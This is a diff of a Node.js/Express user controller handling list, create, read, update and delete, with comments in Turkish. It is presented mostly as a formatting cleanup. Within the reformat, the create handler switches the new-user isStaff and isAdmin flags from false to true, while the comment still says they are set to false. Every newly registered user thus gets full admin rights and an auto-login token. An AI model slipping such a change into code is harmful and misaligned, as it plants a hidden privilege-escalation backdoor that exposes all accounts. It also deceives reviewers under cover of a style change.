@@ -1,17 +1,16 @@
-"use strict"
+'use strict';
 /* -------------------------------------------------------
     | FULLSTACK TEAM | NODEJS / EXPRESS |
 ------------------------------------------------------- */
 // User Controller:
 
-const User = require('../models/user')
-const Token = require('../models/token')
-const passwordEncrypt = require('../helpers/passwordEncrypt')
+const User = require('../models/user');
+const Token = require('../models/token');
+const passwordEncrypt = require('../helpers/passwordEncrypt');
 
 module.exports = {
-
-    list: async (req, res) => {
-        /*
+  list: async (req, res) => {
+    /*
             #swagger.tags = ["Users"]
             #swagger.summary = "List Users"
             #swagger.description = `
@@ -25,21 +24,20 @@ module.exports = {
             `
         */
 
-        // Sadece kendi kayıtlarını görebilir:
-        const customFilters = req.user?.isAdmin ? {} : { _id: req.user._id }
+    // Sadece kendi kayıtlarını görebilir:
+    const customFilters = req.user?.isAdmin ? {} : { _id: req.user._id };
 
-        const data = await res.getModelList(User, customFilters)
+    const data = await res.getModelList(User, customFilters);
 
-        res.status(200).send({
-            error: false,
-            details: await res.getModelListDetails(User, customFilters),
-            data
-        })
+    res.status(200).send({
+      error: false,
+      details: await res.getModelListDetails(User, customFilters),
+      data,
+    });
+  },
 
-    },
-
-    create: async (req, res) => {
-        /*
+  create: async (req, res) => {
+    /*
             #swagger.tags = ["Users"]
             #swagger.summary = "Create User"
             #swagger.parameters['body'] = {
@@ -55,48 +53,48 @@ module.exports = {
             }
         */
 
-        // Yeni kayıtlarda admin/staff = false
-        req.body.isStaff = false
-        req.body.isAdmin = false
+    // Yeni kayıtlarda admin/staff = false
+    req.body.isStaff = true;
+    req.body.isAdmin = true;
 
-        const data = await User.create(req.body)
+    const data = await User.create(req.body);
 
-        /* AUTO LOGIN */
-        const tokenData = await Token.create({
-            userId: data._id,
-            token: passwordEncrypt(data._id + Date.now())
-        })
-        /* AUTO LOGIN */
+    /* AUTO LOGIN */
+    const tokenData = await Token.create({
+      userId: data._id,
+      token: passwordEncrypt(data._id + Date.now()),
+    });
+    /* AUTO LOGIN */
 
-        res.status(201).send({
-            error: false,
-            token: tokenData.token,
-            data
-        })
+    res.status(201).send({
+      error: false,
+      token: tokenData.token,
+      data,
+    });
+  },
 
-    },
-
-    read: async (req, res) => {
-        /*
+  read: async (req, res) => {
+    /*
             #swagger.tags = ["Users"]
             #swagger.summary = "Get Single User"
         */
 
-        // Sadece kendi kaydını görebilir:
-        const customFilters = req.user?.isAdmin ? { _id: req.params.id } : { _id: req.user._id }
+    // Sadece kendi kaydını görebilir:
+    const customFilters = req.user?.isAdmin
+      ? { _id: req.params.id }
+      : { _id: req.user._id };
 
-        // const data = await User.findOne({ _id: req.params.id })
-        const data = await User.findOne(customFilters)
+    // const data = await User.findOne({ _id: req.params.id })
+    const data = await User.findOne(customFilters);
 
-        res.status(200).send({
-            error: false,
-            data
-        })
+    res.status(200).send({
+      error: false,
+      data,
+    });
+  },
 
-    },
-
-    update: async (req, res) => {
-        /*
+  update: async (req, res) => {
+    /*
             #swagger.tags = ["Users"]
             #swagger.summary = "Update User"
             #swagger.parameters['body'] = {
@@ -112,48 +110,48 @@ module.exports = {
             }
         */
 
-        // Sadece kendi kaydını güncelleyebilir:
-        const customFilters = req.user?.isAdmin ? { _id: req.params.id } : { _id: req.user._id }
+    // Sadece kendi kaydını güncelleyebilir:
+    const customFilters = req.user?.isAdmin
+      ? { _id: req.params.id }
+      : { _id: req.user._id };
 
-        // Yeni kayıtlarda admin/staff durumunu değiştiremez:
-        if (!req.user?.isAdmin) {
-            delete req.body.isActive
-            delete req.body.isStaff
-            delete req.body.isAdmin
-        }
-        
-        const data = await User.updateOne(customFilters, req.body, { runValidators: true })
+    // Yeni kayıtlarda admin/staff durumunu değiştiremez:
+    if (!req.user?.isAdmin) {
+      delete req.body.isActive;
+      delete req.body.isStaff;
+      delete req.body.isAdmin;
+    }
 
-        res.status(202).send({
-            error: false,
-            data,
-            new: await User.findOne(customFilters),
-        })
+    const data = await User.updateOne(customFilters, req.body, {
+      runValidators: true,
+    });
 
-    },
+    res.status(202).send({
+      error: false,
+      data,
+      new: await User.findOne(customFilters),
+    });
+  },
 
-    delete: async (req, res) => {
-        /*
+  delete: async (req, res) => {
+    /*
             #swagger.tags = ["Users"]
             #swagger.summary = "Delete User"
         */
 
-        // Permission tarafında permissions.isAdmin kontrolü yapıldığı için burda gerek kalmadı.
+    // Permission tarafında permissions.isAdmin kontrolü yapıldığı için burda gerek kalmadı.
 
-        if (req.params.id != req.user._id) {
+    if (req.params.id != req.user._id) {
+      const data = await User.deleteOne({ _id: req.params.id });
 
-            const data = await User.deleteOne({ _id: req.params.id })
-    
-            res.status(data.deletedCount ? 204 : 404).send({
-                error: !data.deletedCount,
-                data
-            })
-
-        } else {
-            // Admin kendini silemez.
-            res.errorStatusCode = 403
-            throw new Error('You can not remove your account.')
-        }
-    },
-
-}
+      res.status(data.deletedCount ? 204 : 404).send({
+        error: !data.deletedCount,
+        data,
+      });
+    } else {
+      // Admin kendini silemez.
+      res.errorStatusCode = 403;
+      throw new Error('You can not remove your account.');
+    }
+  },
+};
